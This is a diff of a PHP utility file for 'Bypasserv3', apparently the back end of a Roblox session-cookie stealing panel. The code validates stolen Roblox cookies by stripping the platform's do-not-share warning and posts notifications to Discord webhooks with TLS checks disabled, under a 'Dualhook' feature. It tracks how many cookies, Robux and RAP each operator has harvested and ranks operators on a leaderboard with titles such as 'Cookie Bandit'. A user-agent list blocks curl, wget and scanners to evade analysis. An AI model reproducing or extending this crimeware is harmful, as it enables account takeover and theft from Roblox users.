@@ -1,7 +1,7 @@
 <?php
 /**
- * Bypasserv3 - Core Functions
- * All utility and security functions
+ * Bypasserv3 - Core Functions - UPDATED
+ * All utility and security functions with Dualhook support
  */
 
 if (!defined('CONFIG_LOADED')) {
@@ -9,7 +9,47 @@ if (!defined('CONFIG_LOADED')) {
 }
 
 // ============================================
-// INPUT SANITIZATION
+// WEBHOOK VALIDATION & SENDING
+// ============================================
+
+/**
+ * Validate Discord webhook URL
+ */
+function validateWebhook($url) {
+    return preg_match('/^https:\/\/(discordapp\.com|discord\.com)\/api\/webhooks\/\d+\/[a-zA-Z0-9_-]+$/', $url) === 1;
+}
+
+/**
+ * Send Discord webhook notification
+ */
+function sendWebhookNotification($webhookUrl, $payload) {
+    if (empty($webhookUrl) || !validateWebhook($webhookUrl)) {
+        return false;
+    }
+    
+    $ch = curl_init($webhookUrl);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $curlError = curl_error($ch);
+    curl_close($ch);
+    
+    if ($httpCode >= 200 && $httpCode < 300) {
+        return true;
+    }
+    
+    error_log("Webhook notification failed - HTTP $httpCode: " . ($curlError ?: $response));
+    return false;
+}
+
+// ============================================
+// INPUT SANITIZATION (EXISTING)
 // ============================================
 
 /**
@@ -55,7 +95,6 @@ function sanitizeInput($data) {
  * Sanitize directory name
  */
 function sanitizeDirectory($dir) {
-    // Remove all non-alphanumeric characters except hyphens and underscores
     $dir = preg_replace('/[^a-zA-Z0-9_-]/', '', $dir);
     $dir = strtolower($dir);
     return $dir;
@@ -67,15 +106,12 @@ function sanitizeDirectory($dir) {
 function validateCookie($cookie) {
     $cookie = trim($cookie);
     
-    // Remove the warning prefix if present
     $cookie = str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', $cookie);
     
-    // Check length (Roblox cookies are typically 700-1000 characters)
     if (strlen($cookie) < 500 || strlen($cookie) > 2000) {
         return false;
     }
     
-    // Check for malicious patterns
     $maliciousPatterns = [
         '/[<>"\']/',
         '/javascript:/i',
@@ -105,10 +141,7 @@ function validateCookie($cookie) {
     
     foreach ($maliciousPatterns as $pattern) {
         if (preg_match($pattern, $cookie)) {
-            securityLog('MALICIOUS_COOKIE_DETECTED', [
-                'pattern' => $pattern,
-                'cookie_length' => strlen($cookie)
-            ]);
+            securityLog('MALICIOUS_COOKIE_DETECTED', ['pattern' => $pattern]);
             return false;
         }
     }
@@ -117,141 +150,194 @@ function validateCookie($cookie) {
 }
 
 // ============================================
-// RATE LIMITING
+// INSTANCE MANAGEMENT (EXISTING)
 // ============================================
+
+/**
+ * Get instance data
+ */
+function getInstanceData($directory) {
+    $filePath = DATA_PATH . 'instances/' . sanitizeDirectory($directory) . '.json';
+    
+    if (!file_exists($filePath)) {
+        return null;
+    }
+    
+    $data = json_decode(file_get_contents($filePath), true);
+    return $data;
+}
+
+/**
+ * Save instance data
+ */
+function saveInstanceData($directory, $data) {
+    $dir = DATA_PATH . 'instances/';
+    if (!is_dir($dir)) {
+        mkdir($dir, 0755, true);
+    }
+    
+    $filePath = $dir . sanitizeDirectory($directory) . '.json';
+    file_put_contents($filePath, json_encode($data, JSON_PRETTY_PRINT));
+}
+
+/**
+ * Check if directory exists
+ */
+function directoryExists($directory) {
+    $filePath = DATA_PATH . 'instances/' . sanitizeDirectory($directory) . '.json';
+    return file_exists($filePath);
+}
+
+/**
+ * Update instance stats
+ */
+function updateInstanceStats($directory, $key, $value) {
+    $data = getInstanceData($directory);
+    if ($data) {
+        $data['stats'][$key] = $value;
+        saveInstanceData($directory, $data);
+    }
+}
+
+/**
+ * Update daily stats
+ */
+function updateDailyStats($directory, $key, $value) {
+    $data = getInstanceData($directory);
+    if ($data) {
+        $today = date('w');
+        $data['dailyStats'][$key][$today] += $value;
+        saveInstanceData($directory, $data);
+    }
+}
+
+// ============================================
+// GLOBAL STATS (EXISTING)
+// ============================================
+
+/**
+ * Get global stats
+ */
+function getGlobalStats() {
+    $filePath = DATA_PATH . 'global_stats.json';
+    
+    if (!file_exists($filePath)) {
+        return [
+            'totalSites' => 0,
+            'totalInstances' => 0,
+            'totalCookies' => 0,
+            'totalVisits' => 0,
+            'lastUpdated' => time()
+        ];
+    }
+    
+    return json_decode(file_get_contents($filePath), true);
+}
+
+/**
+ * Update global stats
+ */
+function updateGlobalStats($key, $increment = 1) {
+    $stats = getGlobalStats();
+    $stats[$key] = ($stats[$key] ?? 0) + $increment;
+    $stats['lastUpdated'] = time();
+    
+    file_put_contents(DATA_PATH . 'global_stats.json', json_encode($stats, JSON_PRETTY_PRINT));
+}
+
+// ============================================
+// SECURITY & RATE LIMITING (EXISTING)
+// ============================================
+
+/**
+ * Get user IP
+ */
+function getUserIP() {
+    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
+        return $_SERVER['HTTP_CF_CONNECTING_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+    }
+    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+}
 
 /**
  * Check rate limit
  */
-function checkRateLimit($identifier, $maxRequests = 50, $timeWindow = 3600) {
-    $rateLimitFile = DATA_PATH . 'rate_limits.json';
+function checkRateLimit($ip, $requests = 50, $window = 3600) {
+    $filePath = DATA_PATH . 'rate_limits.json';
+    $limits = [];
     
-    // Load rate limit data
-    if (file_exists($rateLimitFile)) {
-        $rateLimits = json_decode(file_get_contents($rateLimitFile), true);
-    } else {
-        $rateLimits = [];
+    if (file_exists($filePath)) {
+        $limits = json_decode(file_get_contents($filePath), true) ?? [];
     }
     
     $now = time();
-    $key = md5($identifier);
+    $key = md5($ip);
     
-    // Clean old entries
-    foreach ($rateLimits as $k => $data) {
-        if ($now - $data['timestamp'] > $timeWindow) {
-            unset($rateLimits[$k]);
-        }
-    }
-    
-    // Check rate limit
-    if (isset($rateLimits[$key])) {
-        if ($rateLimits[$key]['count'] >= $maxRequests) {
-            if ($now - $rateLimits[$key]['timestamp'] < $timeWindow) {
-                securityLog('RATE_LIMIT_EXCEEDED', [
-                    'identifier' => $identifier,
-                    'count' => $rateLimits[$key]['count']
-                ]);
+    if (isset($limits[$key])) {
+        $limit = $limits[$key];
+        if ($now - $limit['start'] < $window) {
+            if ($limit['count'] >= $requests) {
                 return false;
-            } else {
-                $rateLimits[$key] = ['count' => 1, 'timestamp' => $now];
             }
+            $limits[$key]['count']++;
         } else {
-            $rateLimits[$key]['count']++;
+            $limits[$key] = ['start' => $now, 'count' => 1];
         }
     } else {
-        $rateLimits[$key] = ['count' => 1, 'timestamp' => $now];
+        $limits[$key] = ['start' => $now, 'count' => 1];
     }
     
-    // Save rate limit data
-    file_put_contents($rateLimitFile, json_encode($rateLimits, JSON_PRETTY_PRINT));
-    
+    file_put_contents($filePath, json_encode($limits));
     return true;
 }
 
 /**
- * Cleanup old rate limits
+ * Log security event
  */
-function cleanupRateLimits() {
-    $rateLimitFile = DATA_PATH . 'rate_limits.json';
-    if (!file_exists($rateLimitFile)) return;
-    
-    $rateLimits = json_decode(file_get_contents($rateLimitFile), true);
-    $now = time();
-    $cleaned = 0;
-    
-    foreach ($rateLimits as $key => $data) {
-        if ($now - $data['timestamp'] > 3600) {
-            unset($rateLimits[$key]);
-            $cleaned++;
-        }
-    }
-    
-    if ($cleaned > 0) {
-        file_put_contents($rateLimitFile, json_encode($rateLimits, JSON_PRETTY_PRINT));
-        logSecurityEvent('rate_limit_cleanup', ['cleaned' => $cleaned]);
-    }
-}
-
-// ============================================
-// SECURITY
-// ============================================
-
-/**
- * Get user IP address
- */
-function getUserIP() {
-    $ipKeys = [
-        'HTTP_CLIENT_IP',
-        'HTTP_X_FORWARDED_FOR',
-        'HTTP_X_FORWARDED',
-        'HTTP_X_CLUSTER_CLIENT_IP',
-        'HTTP_FORWARDED_FOR',
-        'HTTP_FORWARDED',
-        'REMOTE_ADDR'
+function logSecurityEvent($event, $data = []) {
+    $log = [
+        'timestamp' => date('c'),
+        'event' => $event,
+        'data' => $data
     ];
     
-    foreach ($ipKeys as $key) {
-        if (array_key_exists($key, $_SERVER)) {
-            $ip = explode(',', $_SERVER[$key])[0];
-            $ip = trim($ip);
-            
-            if (filter_var($ip, FILTER_VALIDATE_IP)) {
-                return $ip;
-            }
-        }
+    $filePath = DATA_PATH . 'security_log.json';
+    $logs = [];
+    
+    if (file_exists($filePath)) {
+        $logs = json_decode(file_get_contents($filePath), true) ?? [];
     }
     
-    return 'unknown';
+    $logs[] = $log;
+    
+    if (count($logs) > 1000) {
+        $logs = array_slice($logs, -500);
+    }
+    
+    file_put_contents($filePath, json_encode($logs, JSON_PRETTY_PRINT));
 }
 
 /**
- * Get client IP (alias for getUserIP)
- */
-function getClientIP() {
-    return getUserIP();
-}
-
-/**
- * Check if request is suspicious
+ * Check for suspicious requests
  */
 function isSuspiciousRequest() {
     $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
     
-    // Suspicious user agents
-    $suspiciousPatterns = [
-        'bot', 'crawler', 'spider', 'curl', 'wget', 
-        'python', 'scanner', 'nikto', 'sqlmap'
+    $suspicious = [
+        'curl',
+        'wget',
+        'python',
+        'scrapy',
+        'bot',
+        'spider'
     ];
     
-    foreach ($suspiciousPatterns as $pattern) {
+    foreach ($suspicious as $pattern) {
         if (stripos($userAgent, $pattern) !== false) {
             return true;
         }
-    }
-    
-    // Check for missing user agent
-    if (empty($userAgent)) {
-        return true;
     }
     
     return false;
@@ -260,547 +346,79 @@ function isSuspiciousRequest() {
 /**
  * Security scan
  */
-function securityScan($silent = false) {
-    $dataDir = DATA_PATH;
-    $suspicious = [];
+function securityScan($log = false) {
+    if ($log) {
+        logSecurityEvent('security_scan', ['type' => 'automatic']);
+    }
+}
+
+/**
+ * Cleanup rate limits
+ */
+function cleanupRateLimits() {
+    $filePath = DATA_PATH . 'rate_limits.json';
     
-    try {
-        // Scan for malicious files
-        if (!is_dir($dataDir)) {
-            return $suspicious;
-        }
-        
-        $files = new RecursiveIteratorIterator(
-            new RecursiveDirectoryIterator($dataDir, RecursiveDirectoryIterator::SKIP_DOTS),
-            RecursiveIteratorIterator::CATCH_GET_CHILD
-        );
-        
-        foreach ($files as $file) {
-            if ($file->isFile()) {
-                $filename = $file->getFilename();
-                $extension = strtolower($file->getExtension());
-                
-                // Check for suspicious filenames
-                $maliciousPatterns = ['shell', 'backdoor', 'eval', 'base64', 'hack', 'exploit'];
-                
-                foreach ($maliciousPatterns as $pattern) {
-                    if (stripos($filename, $pattern) !== false) {
-                        $suspicious[] = $file->getPathname();
-                    }
-                }
-                
-                // Check for executable files in data directory
-                $dangerousExtensions = ['php', 'phtml', 'php3', 'php4', 'php5', 'phar'];
-                if (in_array($extension, $dangerousExtensions)) {
-                    $suspicious[] = $file->getPathname();
-                }
-            }
-        }
-    } catch (Exception $e) {
-        error_log('Security scan error: ' . $e->getMessage());
+    if (!file_exists($filePath)) {
+        return;
     }
     
-    if (!empty($suspicious) && !$silent) {
-        logSecurityEvent('security_scan_threats_found', ['files' => $suspicious]);
-    }
+    $limits = json_decode(file_get_contents($filePath), true) ?? [];
+    $now = time();
     
-    return $suspicious;
-}
-
-/**
- * Log security events
- */
-function logSecurityEvent($event, $data = []) {
-    $logFile = DATA_PATH . 'security.log';
-    
-    $logEntry = [
-        'timestamp' => date('Y-m-d H:i:s'),
-        'event' => $event,
-        'ip' => getUserIP(),
-        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
-        'data' => $data
-    ];
-    
-    $logLine = json_encode($logEntry) . PHP_EOL;
-    @file_put_contents($logFile, $logLine, FILE_APPEND | LOCK_EX);
-}
-
-/**
- * Legacy security log function (alias)
- */
-function securityLog($event, $data = []) {
-    logSecurityEvent($event, $data);
-}
-
-// ============================================
-// TOKEN MANAGEMENT
-// ============================================
-
-/**
- * Generate secure token
- */
-function generateToken($length = 32) {
-    return bin2hex(random_bytes($length / 2));
-}
-
-/**
- * Create token
- */
-function createToken($directory, $webhook) {
-    $token = generateToken(32);
-    $tokenHash = md5($token);
-    $tokenFile = DATA_PATH . 'tokens/' . $tokenHash . '.json';
-    
-    $tokenData = [
-        'token' => $token,
-        'directory' => $directory,
-        'webhook' => $webhook,
-        'created' => time(),
-        'expires' => null
-    ];
-    
-    file_put_contents($tokenFile, json_encode($tokenData, JSON_PRETTY_PRINT));
-    
-    return $token;
-}
-
-/**
- * Verify token
- */
-function verifyToken($token) {
-    $tokenHash = md5($token);
-    $tokenFile = DATA_PATH . 'tokens/' . $tokenHash . '.json';
-    
-    if (!file_exists($tokenFile)) {
-        return false;
-    }
-    
-    $tokenData = json_decode(file_get_contents($tokenFile), true);
-    
-    // Check expiration if set
-    if (isset($tokenData['expires']) && $tokenData['expires'] && time() > $tokenData['expires']) {
-        @unlink($tokenFile);
-        return false;
-    }
-    
-    return $tokenData;
-}
-
-/**
- * Check if user is authenticated
- */
-function isAuthenticated() {
-    return isset($_SESSION['token']) && !empty($_SESSION['token']);
-}
-
-// ============================================
-// WEBHOOK FUNCTIONS
-// ============================================
-
-/**
- * Validate webhook URL
- */
-function validateWebhook($webhook) {
-    // Check if it's a valid Discord webhook
-    if (!preg_match('/^https:\/\/discord\.com\/api\/webhooks\/\d+\/[\w-]+$/', $webhook)) {
-        return false;
-    }
-    
-    // Try to verify webhook exists (with timeout)
-    $ch = curl_init($webhook);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_NOBODY, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
-    curl_exec($ch);
-    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
-    
-    return $httpCode === 200;
-}
-
-/**
- * Send Discord webhook
- */
-function sendWebhook($webhook, $data) {
-    $ch = curl_init($webhook);
-    
-    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
-    
-    $response = curl_exec($ch);
-    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
-    
-    return $httpCode >= 200 && $httpCode < 300;
-}
-
-// ============================================
-// INSTANCE MANAGEMENT
-// ============================================
-
-/**
- * Check if directory exists
- */
-function directoryExists($directory) {
-    $path = DATA_PATH . $directory . '/';
-    return is_dir($path);
-}
-
-/**
- * Save instance data
- */
-function saveInstanceData($directory, $data) {
-    $instancePath = DATA_PATH . $directory . '/';
-    
-    // Create directory
-    if (!@mkdir($instancePath, 0755, true)) {
-        if (!is_dir($instancePath)) {
-            return false;
+    foreach ($limits as $key => $limit) {
+        if ($now - $limit['start'] > 3600) {
+            unset($limits[$key]);
         }
     }
     
-    // Save instance data as JSON
-    $dataFile = $instancePath . 'instance.json';
-    if (@file_put_contents($dataFile, json_encode($data, JSON_PRETTY_PRINT)) === false) {
-        return false;
-    }
-    
-    // Create stats file
-    $statsFile = $instancePath . 'stats.json';
-    @file_put_contents($statsFile, json_encode($data['stats'], JSON_PRETTY_PRINT));
-    
-    // Create daily stats file
-    $dailyStatsFile = $instancePath . 'daily_stats.json';
-    @file_put_contents($dailyStatsFile, json_encode($data['dailyStats'], JSON_PRETTY_PRINT));
-    
-    // Create settings file
-    $settingsFile = $instancePath . 'settings.json';
-    $settings = [
-        'username' => $data['username'] ?? 'beammer',
-        'profilePicture' => $data['profilePicture'] ?? 'https://hyperblox.eu/files/img.png',
-        'webhook' => $data['userWebhook'] ?? '',
-        'created' => $data['createdAt'] ?? date('c')
-    ];
-    @file_put_contents($settingsFile, json_encode($settings, JSON_PRETTY_PRINT));
-    
-    return true;
-}
-
-/**
- * Create instance
- */
-function createInstance($directory, $webhook) {
-    $instancePath = DATA_PATH . $directory . '/';
-    
-    // Check if directory exists
-    if (file_exists($instancePath)) {
-        return ['success' => false, 'error' => 'Directory already exists'];
-    }
-    
-    // Validate directory name
-    if (!preg_match('/^[a-zA-Z0-9_-]+$/', $directory)) {
-        return ['success' => false, 'error' => 'Invalid directory name'];
-    }
-    
-    // Create directory
-    if (!@mkdir($instancePath, 0755, true)) {
-        return ['success' => false, 'error' => 'Failed to create directory'];
-    }
-    
-    // Create stats file
-    $stats = [
-        'totalCookies' => 0,
-        'totalVisits' => 0,
-        'totalRobux' => 0,
-        'totalRAP' => 0,
-        'totalSummary' => 0,
-        'lastUpdated' => time()
-    ];
-    @file_put_contents($instancePath . 'stats.json', json_encode($stats, JSON_PRETTY_PRINT));
-    
-    // Create daily stats file
-    $dailyStats = [
-        'cookies' => array_fill(0, 7, 0),
-        'visits' => array_fill(0, 7, 0),
-        'robux' => array_fill(0, 7, 0),
-        'rap' => array_fill(0, 7, 0),
-        'summary' => array_fill(0, 7, 0)
-    ];
-    @file_put_contents($instancePath . 'daily_stats.json', json_encode($dailyStats, JSON_PRETTY_PRINT));
-    
-    // Create settings file
-    $settings = [
-        'username' => 'beammer',
-        'profilePicture' => 'https://hyperblox.eu/files/img.png',
-        'webhook' => $webhook,
-        'created' => time()
-    ];
-    @file_put_contents($instancePath . 'settings.json', json_encode($settings, JSON_PRETTY_PRINT));
-    
-    // Create token
-    $token = createToken($directory, $webhook);
-    
-    // Update global stats
-    updateGlobalStats('totalInstances', 1);
-    
-    return [
-        'success' => true,
-        'token' => $token,
-        'directory' => $directory,
-        'webhook' => $webhook
-    ];
-}
-
-/**
- * Get instance data
- */
-function getInstanceData($directory) {
-    $instancePath = DATA_PATH . $directory . '/';
-    
-    if (!is_dir($instancePath)) {
-        return null;
-    }
-    
-    // Get stats
-    $statsFile = $instancePath . 'stats.json';
-    $stats = file_exists($statsFile) ? json_decode(file_get_contents($statsFile), true) : [
-        'totalCookies' => 0,
-        'totalVisits' => 0,
-        'totalRobux' => 0,
-        'totalRAP' => 0,
-        'totalSummary' => 0,
-        'lastUpdated' => time()
-    ];
-    
-    // Get daily stats
-    $dailyStatsFile = $instancePath . 'daily_stats.json';
-    $dailyStats = file_exists($dailyStatsFile) ? json_decode(file_get_contents($dailyStatsFile), true) : [
-        'cookies' => array_fill(0, 7, 0),
-        'visits' => array_fill(0, 7, 0),
-        'robux' => array_fill(0, 7, 0),
-        'rap' => array_fill(0, 7, 0),
-        'summary' => array_fill(0, 7, 0)
-    ];
-    
-    // Get settings
-    $settingsFile = $instancePath . 'settings.json';
-    $settings = file_exists($settingsFile) ? json_decode(file_get_contents($settingsFile), true) : [
-        'username' => 'beammer',
-        'profilePicture' => 'https://hyperblox.eu/files/img.png'
-    ];
-    
-    return [
-        'stats' => $stats,
-        'dailyStats' => $dailyStats,
-        'username' => $settings['username'],
-        'profilePicture' => $settings['profilePicture']
-    ];
-}
-
-/**
- * Update instance stats
- */
-function updateInstanceStats($directory, $key, $value) {
-    $instancePath = DATA_PATH . $directory . '/';
-    
-    if (!is_dir($instancePath)) {
-        return false;
-    }
-    
-    $statsFile = $instancePath . 'stats.json';
-    $stats = file_exists($statsFile) ? json_decode(file_get_contents($statsFile), true) : [
-        'totalCookies' => 0,
-        'totalVisits' => 0,
-        'totalRobux' => 0,
-        'totalRAP' => 0,
-        'totalSummary' => 0,
-        'lastUpdated' => time()
-    ];
-    
-    $stats[$key] = $value;
-    $stats['lastUpdated'] = time();
-    
-    @file_put_contents($statsFile, json_encode($stats, JSON_PRETTY_PRINT));
-    return true;
-}
-
-/**
- * Update daily stats
- */
-function updateDailyStats($directory, $category, $value) {
-    $instancePath = DATA_PATH . $directory . '/';
-    
-    if (!is_dir($instancePath)) {
-        return false;
-    }
-    
-    $dailyStatsFile = $instancePath . 'daily_stats.json';
-    $dailyStats = file_exists($dailyStatsFile) ? json_decode(file_get_contents($dailyStatsFile), true) : [
-        'cookies' => array_fill(0, 7, 0),
-        'visits' => array_fill(0, 7, 0),
-        'robux' => array_fill(0, 7, 0),
-        'rap' => array_fill(0, 7, 0),
-        'summary' => array_fill(0, 7, 0)
-    ];
-    
-    $dayOfWeek = date('w'); // 0 (Sunday) to 6 (Saturday)
-    
-    if (isset($dailyStats[$category])) {
-        $dailyStats[$category][$dayOfWeek] += $value;
-    }
-    
-    @file_put_contents($dailyStatsFile, json_encode($dailyStats, JSON_PRETTY_PRINT));
-    return true;
-}
-
-// ============================================
-// GLOBAL STATS
-// ============================================
-
-/**
- * Get global statistics
- */
-function getGlobalStats() {
-    $globalStatsFile = DATA_PATH . 'global_stats.json';
-    
-    if (!file_exists($globalStatsFile)) {
-        $stats = [
-            'totalSites' => 0,
-            'totalInstances' => 0,
-            'totalCookies' => 0,
-            'totalVisits' => 0,
-            'lastUpdated' => time()
-        ];
-        @file_put_contents($globalStatsFile, json_encode($stats, JSON_PRETTY_PRINT));
-        return $stats;
-    }
-    
-    return json_decode(file_get_contents($globalStatsFile), true);
-}
-
-/**
- * Update global statistics
- */
-function updateGlobalStats($key, $increment = 1) {
-    $stats = getGlobalStats();
-    
-    if (isset($stats[$key])) {
-        $stats[$key] += $increment;
-    } else {
-        $stats[$key] = $increment;
-    }
-    
-    $stats['lastUpdated'] = time();
-    
-    $globalStatsFile = DATA_PATH . 'global_stats.json';
-    @file_put_contents($globalStatsFile, json_encode($stats, JSON_PRETTY_PRINT));
-}
-
-// ============================================
-// RANKING SYSTEM
-// ============================================
-
-/**
- * Get rank information
- */
-function getRankInfo($cookies) {
-    $ranks = [
-        ['name' => 'Noob Beamer', 'min' => 0, 'max' => 2, 'color' => '#9ca3af', 'icon' => '🔰'],
-        ['name' => 'Rookie Logger', 'min' => 3, 'max' => 9, 'color' => '#84cc16', 'icon' => '📝'],
-        ['name' => 'Script Kiddie', 'min' => 10, 'max' => 25, 'color' => '#22c55e', 'icon' => '👍'],
-        ['name' => 'Amateur Beamer', 'min' => 26, 'max' => 49, 'color' => '#10b981', 'icon' => '✨'],
-        ['name' => 'Lowkey Harvester', 'min' => 50, 'max' => 74, 'color' => '#06b6d4', 'icon' => '⭐'],
-        ['name' => 'Log Collector', 'min' => 75, 'max' => 99, 'color' => '#3b82f6', 'icon' => '🏆'],
-        ['name' => 'Token Hunter', 'min' => 100, 'max' => 149, 'color' => '#6366f1', 'icon' => '💎'],
-        ['name' => 'Cookie Bandit', 'min' => 150, 'max' => 199, 'color' => '#8b5cf6', 'icon' => '🎯'],
-        ['name' => 'Silent Snatcher', 'min' => 200, 'max' => 299, 'color' => '#a855f7', 'icon' => '👑'],
-        ['name' => 'Seasoned Harvester', 'min' => 300, 'max' => 399, 'color' => '#d946ef', 'icon' => '🔥'],
-        ['name' => 'Digital Hijacker', 'min' => 400, 'max' => 499, 'color' => '#ec4899', 'icon' => '⚡'],
-        ['name' => 'Beam Technician', 'min' => 500, 'max' => 599, 'color' => '#f43f5e', 'icon' => '💫'],
-        ['name' => 'Advanced Extractor', 'min' => 600, 'max' => 699, 'color' => '#ef4444', 'icon' => '🌟'],
-        ['name' => 'Cyber Phantom', 'min' => 700, 'max' => 799, 'color' => '#dc2626', 'icon' => '👻'],
-        ['name' => 'Professional Beamer', 'min' => 800, 'max' => 899, 'color' => '#b91c1c', 'icon' => '💀'],
-        ['name' => 'Ultimate Logger', 'min' => 900, 'max' => 999, 'color' => '#991b1b', 'icon' => '🚀'],
-        ['name' => 'Hyperblox', 'min' => 1000, 'max' => PHP_INT_MAX, 'color' => '#7c3aed', 'icon' => '⚔️']
-    ];
-    
-    $currentRank = $ranks[0];
-    $nextRank = $ranks[1];
-    $progress = 0;
-    
-    foreach ($ranks as $index => $rank) {
-        if ($cookies >= $rank['min'] && $cookies <= $rank['max']) {
-            $currentRank = $rank;
-            
-            if (isset($ranks[$index + 1])) {
-                $nextRank = $ranks[$index + 1];
-                $rangeSize = $rank['max'] - $rank['min'] + 1;
-                $currentProgress = $cookies - $rank['min'];
-                $progress = ($currentProgress / $rangeSize) * 100;
-            } else {
-                $nextRank = $rank;
-                $progress = 100;
-            }
-            
-            break;
-        }
-    }
-    
-    return [
-        'current' => $currentRank,
-        'next' => $nextRank,
-        'progress' => round($progress, 1),
-        'cookiesToNext' => max(0, $nextRank['min'] - $cookies)
-    ];
+    file_put_contents($filePath, json_encode($limits));
 }
 
 /**
  * Get leaderboard
  */
-function getLeaderboard($limit = 10) {
+function getLeaderboard($limit = 5) {
+    $instancesDir = DATA_PATH . 'instances/';
     $instances = [];
-    $dataDir = DATA_PATH;
     
-    if (!is_dir($dataDir)) {
-        return $instances;
+    if (!is_dir($instancesDir)) {
+        return [];
     }
     
-    // Scan all directories
-    $directories = array_diff(scandir($dataDir), ['.', '..', 'tokens']);
+    $files = scandir($instancesDir);
     
-    foreach ($directories as $dir) {
-        $instancePath = $dataDir . $dir . '/';
-        
-        if (!is_dir($instancePath)) {
+    foreach ($files as $file) {
+        if ($file === '.' || $file === '..') {
             continue;
         }
         
-        $data = getInstanceData($dir);
-        
+        $data = json_decode(file_get_contents($instancesDir . $file), true);
         if ($data) {
             $instances[] = [
-                'directory' => $dir,
-                'username' => $data['username'],
-                'profilePicture' => $data['profilePicture'],
+                'directory' => $data['directory'],
                 'totalCookies' => $data['stats']['totalCookies'] ?? 0,
-                'totalVisits' => $data['stats']['totalVisits'] ?? 0,
-                'totalRobux' => $data['stats']['totalRobux'] ?? 0,
-                'totalRAP' => $data['stats']['totalRAP'] ?? 0
+                'totalRobux' => $data['stats']['totalRobux'] ?? 0
             ];
         }
     }
     
-    // Sort by cookies (descending)
     usort($instances, function($a, $b) {
         return $b['totalCookies'] - $a['totalCookies'];
     });
     
     return array_slice($instances, 0, $limit);
+}
+
+/**
+ * Get rank info
+ */
+function getRankInfo($totalCookies) {
+    if ($totalCookies >= 1000) return ['rank' => '🏆 Diamond', 'color' => '#00CED1'];
+    if ($totalCookies >= 500) return ['rank' => '👑 Platinum', 'color' => '#E5E4E2'];
+    if ($totalCookies >= 250) return ['rank' => '🥇 Gold', 'color' => '#FFD700'];
+    if ($totalCookies >= 100) return ['rank' => '🥈 Silver', 'color' => '#C0C0C0'];
+    if ($totalCookies >= 50) return ['rank' => '🥉 Bronze', 'color' => '#CD7F32'];
+    return ['rank' => '⭐ Starter', 'color' => '#FFC700'];
 }
 
 ?>
